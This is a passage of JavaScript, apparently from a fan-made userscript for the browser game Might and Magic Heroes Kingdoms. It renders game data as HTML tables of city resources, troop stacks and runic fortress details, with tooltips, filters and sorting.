				var r = c.attachedRessourceStackList;
				$row = $('<tr style="height:44px;"></tr>');
				$('<th class="city'+c.id+'-ressourceTotal">'+c.cityName+'</th>').appendTo($row);
				for(j=0;j<7;j++){
					//console.log(HOMMK.elementPool.obj.RessourceStack);
					res = HOMMK.elementPool.obj.RessourceStack.obj[r[j].id];
					$content = $(res.container).clone(false).children().removeClass('hidden').end();
					$content.find('.ressourceStackQuantity').removeClass('ressourceStackQuantity');
					$content.find('.ressourceStackIncome').css({'color':'gray','font-size':'8px'});
					if($content.find('.ressourceStackIncome').text().substr(0,1)=='-'){
						$content.find('.ressourceStackIncome').css({'color':'red'});
					}
					$('<td style="width:12%;"></td>').append($content).hover(function(){
							$tooltip.show();
						},function(){
							$tooltip.hide();
						}).appendTo($row);
				}
				$row.appendTo($table);
			})(cities[i]);
		}
	
	}function buildTroops(){
	var i, j, c;
	var HTML = '<table style="width:100%;background-color:white;color:black;" id="data_troops" border="1">'
	var cities = HOMMK.elementPool.obj.RegionCity.values().sort(function(a,b){return a.content.captureDate - b.content.captureDate;});
	for(i=0;i<cities.length;i++){
		c = cities[i].content;
		HTML += '<tr style="height:44px;"><th class="city'+c.id+'-troopTotal">'+c.cityName+'</th>';
		for(j=1;j<=8;j++){
			HTML += '<td class="city'+c.id+'-troop'+j+'"></td>';
		}
		HTML += '</tr>';
	}
	HTML += '<tr style="height:44px;"><th class="troopTotal">Total</th>';
	for(j=1;j<=8;j++){
		HTML += '<td class="total-troop'+j+'"></td>';
	}
	HTML += '</tr></table>';
	$('#data-tabs-3').html(HTML);
	var regionId, h, s, c, stacks = HOMMK.elementPool.obj.UnitStack.values();
	var header = '<div class="white zoneTooltipHeader tooltipHeader"></div>';
	var $tooltip = $('<div id="Tooltip" class="tooltip" >'+header+HOMMK.elementModelPool.obj.UnitStackTooltip+'</div>')
		.css({
			zIndex:99999999,
			position:'absolute',
			top:'50px',
			left:'50px'
		})
		.hide()
		.appendTo($(document.body))
		.children('#UnitStackTooltipModelDescription').removeClass('hidden').end();
	$tooltip.find('#UnitStackTooltipModelDescriptionTypeImage')[0].style.cssText = "background-image: url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.134-6-MTR/img/css_sprite/UnitStack_types.gif); width: 22px; height: 22px; background-position: -66px -66px; background-repeat: repeat repeat;";
	var mergeStack = {}; 
	var citiesPower = {};
	var totalPower = 0;
	for(i=0;i<stacks.length;i++){
		s = stacks[i], c = s.content;
		regionId = 0;
		if(c.regionId){
			regionId = c.regionId;
		}
		else if(c.heroId){
			h = HOMMK.elementPool.obj.Hero.obj[c.heroId];
			if(h && h.content.regionId){
				regionId = h.content.regionId;
			}
		}
		if(regionId){
			(function(unit,html,regionId){
				var tier = unit.tier.substr(1,1), id = unit.id;
				var $stack = $(html).clone(false)
					.children().removeClass('draggableElement hidden')
					.children().removeClass('unitStackQuantitySplitable draggableHandle')
					.end().end()
					.css({
						cursor:'pointer',
						top:'-6px',
						position:'relative'
					})
					.hover(function(e){	
							update_tooltip(unit,e);
						},
						function(){$
							$tooltip.hide();
						});
				jQuery('.city'+regionId+'-troop'+tier).append($stack);
			})(c,s.container,regionId);
		}
		mergeStack[c.unitEntityTagName] = mergeStack[c.unitEntityTagName] || {qty:0,obj:s};
		mergeStack[c.unitEntityTagName].qty += c.quantity;
		//
		citiesPower[regionId] = citiesPower[regionId] || 0;
		citiesPower[regionId] += c.quantity*c.unitEntityPower;
		totalPower += c.quantity*c.unitEntityPower;
	}
	for(i in citiesPower){
		$('.city'+i+'-troopTotal').append($('<div class="discret">'+format_milles(citiesPower[i],' ')+'</div>'));
	}
	$('.troopTotal').append($('<div class="discret">'+format_milles(totalPower,' ')+'</div>'));
	
	for(i in mergeStack){
		var qty = mergeStack[i].qty;
		s = mergeStack[i].obj, c = s.content;
		regionId = 0;
		if(c.regionId){
			regionId = c.regionId;
		}
		else if(c.heroId){
			h = HOMMK.elementPool.obj.Hero.obj[c.heroId];
			if(h && h.content.regionId){
				regionId = h.content.regionId;
			}
		}
		if(regionId){
			(function(unit,html,regionId,qty){
				var tier = unit.tier.substr(1,1), id = unit.id;
				var $stack = $(html).clone(false)
					.children().removeClass('draggableElement hidden')
					.children().removeClass('unitStackQuantitySplitable draggableHandle')
					.end().end()
					.css({
						cursor:'pointer',
						top:'-6px',
						position:'relative'
					})
					.hover(function(e){	
							update_tooltip(unit,e,qty);
						},
						function(){$
							$tooltip.hide();
						});
				var qty_text = qty<1000?qty:parseInt(qty/1000)+'K';
				$stack.find('.boldFont').text(qty_text);
				jQuery('.total-troop'+tier).append($stack);
			})(c,s.container,regionId,qty);
		}
	}
	var types = {
		INFANTRY: '-66px',
		SHOOTER: '-22px',
		CAVALRY: '-44px'
	};
	//var $tooltip = $('<div class="tooltip" style="z-index: 100000;"><div class="white zoneTooltipHeader tooltipHeader"><div class="frameSeparator2"></div></div>');
	function update_tooltip(unit,e,qty) {
		qty = qty || unit.quantity;
		console.log($tooltip);
		$tooltip.children('.tooltipHeader').text(unit.unitEntityName);
		$tooltip.find('#UnitStackTooltipModelDescriptionPower').text(format_milles(unit.unitEntityPower,' '));
		$tooltip.find('#UnitStackTooltipModelDescriptionTotalQuantity').text(format_milles(qty,' '));
		$tooltip.find('#UnitStackTooltipModelDescriptionTotalPower').text(format_milles((unit.unitEntityPower*qty),' '));
		$tooltip.find('#UnitStackTooltipModelDescriptionTypeImage').css('background-position',types[unit.unitEntityType]+' -66px');
		
		$tooltip.show().css({
			top: e.pageY+14+'px',
			left: e.pageX-120+'px'
		});
	}
	
}function buildSpells(){
		var data_spells = '<input type="button" id="REFRESHABLE2" value="refresh" />';
		var cityList = HOMMK.elementPool.obj.RegionCity.values();
		for(var i=0;i<cityList.length;i++){
			
		}
		$('#data-tabs-2').html(data_spells);
		$('#REFRESHABLE').click(refresh);
}	function fillFortressList( json ){

		function processFortressUpdates( fortressList ) {
			for ( var fortressIndex in fortressList )
			{
				if ( !HOMMK_user.RunicFortress.list[fortressIndex] ) {		// Fill last info for updates on change
					HOMMK_user.RunicFortress.list[fortressIndex] = new Object();
					HOMMK_user.RunicFortress.list[fortressIndex].ownerName = new String( fortressList[fortressIndex].ownerName );
					HOMMK_user.RunicFortress.list[fortressIndex].id = fortressList[fortressIndex].id;
					if ( fortressList[fortressIndex]._npcAttackDate )
						HOMMK_user.RunicFortress.list[fortressIndex].attackTime = fortressList[fortressIndex]._npcAttackDate;
				} else if ( HOMMK_user.RunicFortress.list[fortressIndex] && HOMMK_user.RunicFortress.list[fortressIndex].ownerName != fortressList[fortressIndex].ownerName ) {
					if ( HOMMK_user.RunicFortress.info && HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+HOMMK_user.RunicFortress.list[fortressIndex].id] )
						delete HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+HOMMK_user.RunicFortress.list[fortressIndex].id];
					HOMMK_user.RunicFortress.list[fortressIndex].ownerName = new String( fortressList[fortressIndex].ownerName );
					HOMMK_user.RunicFortress.list[fortressIndex].id = fortressList[fortressIndex].id;
				} else if ( HOMMK_user.RunicFortress.list[fortressIndex] && HOMMK_user.RunicFortress.list[fortressIndex].attackTime && HOMMK_user.RunicFortress.list[fortressIndex].attackTime < HOMMK.DateUtils.getCurrentTimestamp() ) {
					if ( HOMMK_user.RunicFortress.info && HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+HOMMK_user.RunicFortress.list[fortressIndex].id] )
						delete HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+HOMMK_user.RunicFortress.list[fortressIndex].id];
					delete HOMMK_user.RunicFortress.list['attackTime'];
				}
			}	
		}
		
		HTML = '';		
		var fortressList = [];
		if ( json )
			fortressList = json.d['RegionBuildingListFrame'+HOMMK.player.content.worldId].regionBuildingList;
		else
			fortressList = HOMMK.elementPool.obj.RegionBuildingListFrame.obj[HOMMK.player.content.worldId].content.regionBuildingList;

		var darkElvesName = 0;
		var countsByAlly = {};
		for ( var fortressIndex in fortressList )
		{
			var runicFort = fortressList[fortressIndex];
			if ( countsByAlly[runicFort.ownerName] == null )
				countsByAlly[runicFort.ownerName] = 1;
			else
				countsByAlly[runicFort.ownerName] += 1;
			if ( runicFort.occupiedByDungeonNpc )
				darkElvesName = runicFort.ownerName;
		}
		processFortressUpdates( fortressList );
		
		HTML += 'Filter by: ';
		HTML += '<select id="FORTRESS_FILTER">';
		HTML += '<option value="AllFortres">All fortress</option>';
		if ( darkElvesName )
			HTML += '<option value="' + darkElvesName + '"> ' + darkElvesName + '    <b>(' + countsByAlly[darkElvesName] + ')</b></option>';
		for ( var allyName in countsByAlly )
			if ( allyName != darkElvesName )
				HTML += '<option value="' + allyName + '"> ' + allyName + '    <b>(' + countsByAlly[allyName] + ')</b></option>';
		HTML += '</select>';
		HTML += '<input type="button" id="GET_FILTERED_FORTRESS" value="Get Selected" />';
		HTML += '     Sort by: ';
		HTML+= '<select id="FORTRESS_SORTS">';
		HTML+= '<option value="name">Name</option>';
		HTML+= '<option value="capture">Capture date</option>';
		HTML+= '<option value="owner">Owner name</option>';
		HTML+= '<option value="attack">Attack date</option>';
		HTML+= '</select>'

		HTML += '<div style="height: 480px;width:834px; border-left: 0px; outline: none; float: none;overflow:auto;">';
		HTML += '<table style="font-weight:bold;width:100%;background-color:#B58066;color:black;" id="runic_fortress" border="1" bordercolor=#754728>';
		for ( var fortressIndex in fortressList )
		{
			var runicFort = fortressList[fortressIndex];
			if ( isNaN( parseInt( fortressIndex ) ) )
				break;
			HTML += '<tr id="Rune-fortress-at-region-' + runicFort.regionId + '">';
			HTML += '<td id="sortParams" style="display:none">';
			HTML += '<div id="sortParOwner" style="display: none">' + runicFort.ownerName + '</div>';
			HTML += '<div id="sortParName" style="display: none">' + runicFort.name + '</div>';
			var attackDateData = runicFort._npcAttackDate ? runicFort._npcAttackDate : 2326525710;	// date in future for sorting
			HTML += '<div id="sortParAttack" style="display: none">' + attackDateData + '</div>';
			HTML += '<div id="sortParCapture" style="display: none">' + runicFort.captureDate + '</div>';
			HTML += '<div id="regionId" style="display: none">' + runicFort.regionId + '</div>';
			HTML += '</td>';

			// Name field
			HTML += '<td id="Fortress-name-' + runicFort.id + '">';
			HTML += '<div style="height: 5px;"></div>';
			
			var worldId = HOMMK.player.content.worldId;
			if ( worldId == 2081 || worldId == 2011 || worldId == 2562 ) {
				var rfId = runicFort.regionX + (runicFort.regionY - 1) * HOMMK.elementPool.obj.WorldMap.obj[HOMMK.player.content.worldId].content._size;
				if ( runicFort.isViewedByOwner )
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#2B4C6F" ><b>' + (runicFort.name.charCodeAt(0) == '?'.charCodeAt(0) ? rfId : runicFort.name) + '</b></a><br>';
				else if ( runicFort.occupiedByDungeonNpc )
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#805099" ><b>' + (runicFort.name.charCodeAt(0) == '?'.charCodeAt(0) ? rfId : runicFort.name) + '</b></a><br>';
				else
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#1F635E" ><b>' + (runicFort.name.charCodeAt(0) == '?'.charCodeAt(0) ? rfId  : runicFort.name) + '</b></a><br>';
			} else {
				if ( runicFort.isViewedByOwner )
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#2B4C6F" ><b>' + runicFort.name + '</b></a><br>';
				else if ( runicFort.occupiedByDungeonNpc )
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#805099" ><b>' + runicFort.name + '</b></a><br>';
				else
					HTML += '<a href=# title="Click to center" onClick="HOMMK.worldMap.center(parseInt('+runicFort.regionX+'), parseInt('+runicFort.regionY+'))" style="color:#1F635E" ><b>' + runicFort.name + '</b></a><br>';
			}
			var imageCoeff = 0.75;
			if ( runicFort._npcAttackDate )
				HTML += '<div onClick="HOMMK_user.func.receiveDataForFortress('+runicFort.regionId+')" style="background-image: url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/regionBuildingsZoom2.gif); background-position: -' + 528 * imageCoeff + 'px -'+132 * imageCoeff+'px; background-repeat: repeat; margin: 0px auto; height: ' + 66 * imageCoeff + 'px; width: ' + 66 * imageCoeff + 'px; background-size: ' + 1058 * imageCoeff + 'px"></div>';		// Attacked
			else if ( runicFort.occupiedByDungeonNpc )
				HTML += '<div onClick="HOMMK_user.func.receiveDataForFortress('+runicFort.regionId+')" style="background-image: url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/regionBuildingsZoom2.gif); background-position: -' + 858 * imageCoeff+'px -'+66 * imageCoeff+'px; background-repeat: repeat; margin: 0px auto; height: ' + 66 * imageCoeff + 'px; width: ' + 66 * imageCoeff + 'px; background-size: ' + 1058 * imageCoeff + 'px"></div>';	// Dark Elves
			else
				HTML += '<div onClick="HOMMK_user.func.receiveDataForFortress('+runicFort.regionId+')" style="background-image: url(http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/regionBuildingsZoom2.gif); background-position: -' + 528 * imageCoeff + 'px -'+66 * imageCoeff + 'px; background-repeat: repeat; margin: 0px auto; height: ' + 66 * imageCoeff + 'px; width: ' + 66 * imageCoeff + 'px;  background-size: ' + 1058 * imageCoeff + 'px"></div>';	// Normal				
			HTML += '</td>';
			
			// Owner field
			HTML += '<td class="hommk-fortress-date" id="Fortress-own-' + runicFort.id + '">';
			HTML += '<div style="height: 5px;"></div>';
			var color = '#5D3B20';
			if ( runicFort.isViewedByOwner )
				color = '#2B4C6F';
			else if ( runicFort.occupiedByDungeonNpc )
				color = '#805099';
			else
				color = '#1F635E';
			HTML += '<div style="color:' + color + ';"><b>'+ runicFort.ownerName + '</b></div>';
			HTML += '<div style="height: 9px;"></div>';
			HTML += 'From: ' + HOMMK.DateUtils.timestampToString(runicFort.captureDate, HOMMK.DATEUTILS_TIME_FORMAT_DATE_HOUR);
			HTML += '<br>';
			
			var hiddenTooltip = '<div class="hiddenTooltip"><div class="tooltipTitle">'+'Parameters:'+'</div>';
			if ( runicFort._npcAttackDate )
			{
				var attackDate = HOMMK.DateUtils.timestampToString(runicFort._npcAttackDate, HOMMK.DATEUTILS_TIME_FORMAT_DATE_HMS);
				HTML += '<div style="color:#b00000">Attack: ' + attackDate + '</div>';		
				hiddenTooltip += '<table border="0" cellspacing="1" cellpadding="0"><tr>';				
				hiddenTooltip += '<td><div><b>To Attack</b>: </div></td>';
				hiddenTooltip += '<td><div id="time_element"></div></td>';
				hiddenTooltip += '</tr></table>';	
				hiddenTooltip += '<div id="time_data" style="display: none">' + runicFort._npcAttackDate + '</div>';
			}
			
			var ownTime = HOMMK.DateUtils.getCurrentTimestamp() - runicFort.captureDate;
			if ( !runicFort.occupiedByDungeonNpc )
			{
				var pointsPerDay = 24000;
				if ( ownTime < 60*60*24 )
					pointsPerDay = 0;
				else if ( ownTime < 60*60*24*7 )
					pointsPerDay = 12000;
				/*else //if ( ownTime < 60*60*24*14 )
					pointsPerDay = 24000;*/
				hiddenTooltip += '<div><b>Points per day</b>: '+ pointsPerDay +'</div>';
			}
			if  ( ownTime < 60*60*24 ) {
				hiddenTooltip += '<table border="0"><tr>';				
				hiddenTooltip += '<td><div><b>Protection</b>: </div></td>';
				hiddenTooltip += '<td><div id="time_of_getting"></div></td>';
				hiddenTooltip += '</tr></table>';
				hiddenTooltip += '<div id="time_capture" style="display: none">' + runicFort.captureDate + '</div>';
			}
	
			hiddenTooltip += '</div>';			
			HTML += hiddenTooltip;
			HTML += '</td>';
			
			HTML += '<td width=95px id="Fortress-gate-' + runicFort.id + '" class="hommk-fortress-gate">' + 'Data not received';
			hiddenTooltip = '<div class="hiddenTooltip"><div class="tooltipTitle">'+'Parameters:'+'</div>';
			hiddenTooltip += '<div>Select Filter and press Get Selected</div>';
			hiddenTooltip += '</div>';
			HTML += hiddenTooltip;
			HTML += '</td>';
			
			for ( var curLevel = 0; curLevel < 5; curLevel++ ) 	{
				HTML += '<td width=95px id="Fortress-level-' + curLevel + '-' + runicFort.id + '" class="hommk-fortress-level">' + 'Data not received';	
				hiddenTooltip = '<div class="hiddenTooltip"><div class="tooltipTitle">'+'Parameters:'+'</div>';
				hiddenTooltip += '<div>Select Filter and press Get Selected</div>';
				hiddenTooltip += '</div>';
				HTML += hiddenTooltip;
				HTML += '</td>';
			}
			HTML += '</tr>';
		}
		HTML += '</table>';
		HTML += '</div>';
		return HTML;
	}		
		
	var numToReceive = 0;
	
	function fillFortressData( json ){
		
		function getFortressForInfo( json ) {
			var fortressData = 0;
			var nameId = 0;
			if ( !json.d ) {
				nameId = json;
				if ( HOMMK_user.RunicFortress.info[nameId] )
					fortressData  = HOMMK_user.RunicFortress.info;
				else
					return;
			}
			else {
				fortressData = json.d;
				for ( var i in json.d ) {
					nameId = i;
					break;
				}
				if ( nameId == 0 )
					return;
				HOMMK_user.RunicFortress.info['RunicFortressRegionBuildingFrame'+fortressData[nameId].id] = json.d[nameId];
			}
			return fortressData[nameId];
		}
		function getUnitsData( levelUnits ) {
			var unitsData = [];
			for ( var unitPos in levelUnits ) {
				var unitData = levelUnits[unitPos];
				unitsData[unitData.stackPosition-1] = new Array();

				unitsData[unitData.stackPosition-1][0] = '<div style="' + HOMMK_user.func.getStyleStringForImage( "UnitStack_"+unitData.factionEntityTagName, unitData.tier ) + '"></div>';
				unitsData[unitData.stackPosition-1][1] = unitData.quantity > 999 ? '' + Math.floor(unitData.quantity/1000) + 'k' : '' + unitData.quantity;
				unitsData[unitData.stackPosition-1][2] = unitData.quantity * unitData.unitEntityPower;
			}
			return unitsData;
		}
		
		function getHTMLForHeroInFortress( fortress ) {
			var cellData = '  ';
			
			var levelUnits = fortress.hero.attachedUnitStackList;
			var unitsData = getUnitsData( levelUnits );
			
			var pos = unitsData.length <= 3 ? 3 : 7;
			unitsData[pos] = new Array();
			unitsData[pos][0] = '<div id="RunicFortressRegionBuildingFrame131502DoorContainer" class="runicFortressHero" style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressFloors.jpg); background-position: -1px -128px; background-repeat: repeat; width: 23px; height: 22px;  background-size: 206px;  margin-left: 0px; margin-top: 3px; float: left; display: block;">';
			unitsData[pos][1] = ' ';
			unitsData[pos][2] = 0;
			
			var cellData = '';
			if ( unitsData.length > 0 ) {
				cellData += '<table border=0 cellspacing=1 cellpadding=0 style="width:100%; height:100%; font-weight: normal" border="0">';
				cellData += '<tr>';
				for ( var unitPos = 0; unitPos < 8; unitPos++ ) {
					if ( unitsData[unitPos] ) {
						cellData += '<td><div style="height: 35px; width: 23px; font-size: x-small;">'+unitsData[unitPos][0] + unitsData[unitPos][1] + '</div></td>';
					} else
						cellData += '<td><div style="height: 35px; width: 23px;"> </div></td>'
					
					if ( unitPos == 3 ) {
						if ( unitsData.length > 4 )
							cellData += '</tr><tr>';
						else
							break;
					}
				}				
				cellData += '</tr>';
				cellData += '</table>';
			}
			
			
			if ( fortress.hero.allianceId == fortress.ownerAllianceId )
				cellData += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -23px; background-repeat: repeat; width: 16px; height: 17px; margin: 0px auto; float: left; display: block; background-size: 250px" onclick="HOMMK_user.func.jactariFortress(' + fortress.id+ ', 0,' + true + ', event)"></div>';
			else
				cellData += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -0px -44px; background-repeat: repeat; width: 19px; height: 19px; margin: 0px auto; float: left; display: block; background-size: 250px" onclick="HOMMK_user.func.jactariFortress(' + fortress.id+ ', 0,' + true + ', event)"></div>';
			
			var levelStrength = 0;
			for ( var curUnit in unitsData ) {
				levelStrength += unitsData[curUnit][2];
			}
			var levelStrengthStrR = HOMMK_user.func.intToStringApostrophe( levelStrength );
			cellData += '<div align=right style="margin: 0px auto; margin-top: 2px; width: 76px; float:left; ">' + levelStrengthStrR + '</div>';
			
			var hiddenTooltip = '<div class="hiddenTooltip"><div class="tooltipTitle">'+'Parameters:'+'</div>';
			hiddenTooltip += '<table border="0">';				
			if ( fortress.hero.allianceName )
				hiddenTooltip += '<tr><td><b>Alliance</b>: </td><td>'+ fortress.hero.allianceName +'</td></tr>';
			if ( fortress.hero.playerName )
				hiddenTooltip += '<tr><td><b>Player</b>: </td><td>'+ fortress.hero.playerName +'</td></tr>';
			if ( fortress.hero.name )
				hiddenTooltip += '<tr><td><b>Hero</b>: </td><td>'+ fortress.hero.name +'</td></tr>';
			if ( fortress.hero._level )
				hiddenTooltip += '<tr><td><b>Hero level</b>: </td><td>'+ fortress.hero._level +'</td></tr>';
			if ( fortress.hero.armyPower )
				hiddenTooltip += '<tr><td><b>Strength</b>: </td><td>'+ HOMMK_user.func.intToStringApostrophe(fortress.hero.armyPower) +'</td></tr>';
			hiddenTooltip += '</table>';
			hiddenTooltip += '</div>';
			
			cellData += hiddenTooltip;
			return cellData;
		}
		
		function getHTMLForEmptyLevel( fortress, level ) {
			var data = '';
			var defType = fortress.regionBuildingComponentList[level].defenseTypeShortName;
			if ( defType == "BALISTAS" ) {
				data += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -41px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px; margin-left: 28px; margin-top: 3px; float: left; display: block;"></div><div style="float: left; display: block; margin-left: 5px; margin-top: 6px;">   ' + (fortress.regionBuildingComponentList[level].defenseLevel ? '' + fortress.regionBuildingComponentList[level].defenseLevel : '0') + '</div>';
			}
			else if ( defType == "ANTIMAGIC" ) {
				data += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -92px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px; margin-left: 28px; margin-top: 3px; float: left; display: block;"></div><div style=" float: left; display: block; margin-left: 5px; margin-top: 6px;">   ' + (fortress.regionBuildingComponentList[level].defenseLevel ? '' + fortress.regionBuildingComponentList[level].defenseLevel : '0') + '</div>'; 
			}
			else if ( defType == "TRAPS" ) {
				data += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -66px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px; margin-left: 28px; margin-top: 3px; float: left; display: block;"></div><div style=" float: left; display: block; margin-left: 5px; margin-top: 6px;">   ' + (fortress.regionBuildingComponentList[level].defenseLevel ? '' + fortress.regionBuildingComponentList[level].defenseLevel : '0') + '</div>';
			}
			else
				data += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -46px -23px; background-repeat: repeat; width: 22px; height: 22px; background-size: 250px; margin-left: 38px; margin-top: 3px; float: left; display: block;"></div>';
			
			if ( fortress.regionBuildingComponentList && fortress.regionBuildingComponentList[level] && fortress.regionBuildingComponentList[level].winnerPlayer ) {
				data += '<div style="display: block; margin-top: 26px;">Attacked by:</div>';
				data += fortress.regionBuildingComponentList[level].winnerPlayer._name;
				data += '<br>';
				data += '(<b>' + fortress.regionBuildingComponentList[level].winnerPlayer.allianceName + '</b>)';
			}
			return data;
		}
		function getHTMLForLevel( fortress, level ) {
			var levelUnits = fortress.floorsUnitStacks[level];
			
			var hiddenTooltip = '<div class="hiddenTooltip"><div class="tooltipTitle">'+'Parameters:'+'</div>';
			hiddenTooltip += '<table border="0">';

			var unitsData = getUnitsData( levelUnits );
			
			var defType = fortress.regionBuildingComponentList[level].defenseTypeShortName;
			if ( defType )
			{
				var pos = unitsData.length <= 3 ? 3 : 7;
				unitsData[pos] = new Array();
				if ( defType == "BALISTAS" )
					unitsData[pos][0] = '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -41px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px"></div>';
				else if ( defType == "ANTIMAGIC" )
					unitsData[pos][0] = '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -92px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px"></div>';
				else if ( defType == "TRAPS" )
					unitsData[pos][0] = '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -66px; background-repeat: repeat; width: 23px; height: 22px; background-size: 125px"></div>';
				else
					unitsData[pos][0] = '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -1px; background-repeat: repeat; width: 14px; height: 20px; background-size: 250px"></div>';
				unitsData[pos][1] = fortress.regionBuildingComponentList[level].defenseLevel ? '' + fortress.regionBuildingComponentList[level].defenseLevel : '0';
				unitsData[pos][2] = 0;
			}
			
			var cellData = '';
			if ( unitsData.length > 0 ) {
				cellData += '<table border=0 cellspacing=1 cellpadding=0 style="width:100%; height:100%; font-weight: normal" border="0">';
				cellData += '<tr>';
				for ( var unitPos = 0; unitPos < 8; unitPos++ ) {
					if ( unitsData[unitPos] ) {
						cellData += '<td><div style="height: 35px; width: 23px; font-size: x-small;">'+unitsData[unitPos][0] + unitsData[unitPos][1] + '</div></td>';
					} else
						cellData += '<td><div style="height: 35px; width: 23px;"> </div></td>'
					
					if ( unitPos == 3 ) {
						if ( unitsData.length > 4 )
							cellData += '</tr><tr>';
						else
							break;
					}
				}				
				cellData += '</tr>';
				cellData += '</table>';
			}
			
			if ( fortress.regionBuildingComponentList[level].playerCombatType && fortress.regionBuildingComponentList[level].playerCombatType == "ATTACK" ) {
				unitsData.sort( function(a,b){return b[2] - a[2];} );
			}			
			for ( var unitPos in unitsData ) {
				if ( unitsData[unitPos][2] == 0 )
					continue;
				hiddenTooltip += '<tr>';
				hiddenTooltip += '<td>' + unitsData[unitPos][0] + '</td><td><div style="width:66px; text-align: right;">' + HOMMK_user.func.intToStringApostrophe( unitsData[unitPos][2] ) +'</div></td>';
				hiddenTooltip += '</tr>';
			}
			
			if ( fortress.regionBuildingComponentList[level].playerCombatType ) {
				if ( fortress.regionBuildingComponentList[level].playerCombatType == "DEFENSE" )
					cellData += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -23px; background-repeat: repeat; width: 16px; height: 17px; margin: 0px auto; float: left; display: block; background-size: 250px" onclick="HOMMK_user.func.jactariFortress(' + fortress.id+ ',' + level + ',' + false + ', event)"></div>';
				else
					cellData += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -0px -44px; background-repeat: repeat; width: 19px; height: 19px; margin: 0px auto; float: left; display: block; background-size: 250px" onclick="HOMMK_user.func.jactariFortress(' + fortress.id+ ',' + level + ',' + true + ', event)"></div>';
			} else
				cellData += '<div style="background-image: url( http://static5.cdn.ubi.com/u/HOMMK/mightandmagicheroeskingdoms.ubi.com/1.5.0.122-12-MTR/img/css_sprite/Season3_runicFortressIcons.png ); background-position: -2px -1px; background-repeat: repeat; width: 14px; height: 20px; margin: 0px auto; float: left; display: block; background-size: 250px" onclick="HOMMK_user.func.jactariFortress(' + fortress.id+ ',' + level + ',' + true + ', event)"></div>';	
				
			var levelStrength = 0;
			for ( var curUnit in unitsData ) {
				levelStrength += unitsData[curUnit][2];
			}
			var levelStrengthStrR = HOMMK_user.func.intToStringApostrophe( levelStrength );
			cellData += '<div align=right style="margin: 0px auto; margin-top: 2px; width: 76px; float:left; ">' + levelStrengthStrR + '</div>';

			hiddenTooltip += '</table>';
			hiddenTooltip += '</div>';
			cellData += hiddenTooltip;
			return cellData;
		}
		
		var fortress = getFortressForInfo( json );
		
		var cellData = '';
		if ( fortress.hero )
			cellData = getHTMLForHeroInFortress( fortress );
		var cell = document.getElementById( 'Fortress-gate-' +  fortress.id );
		cell.innerHTML = cellData;
				
		for ( var level = 1; level < 6; level++ ) {
			var levelUnits = fortress.floorsUnitStacks[level];
			cellData = '';
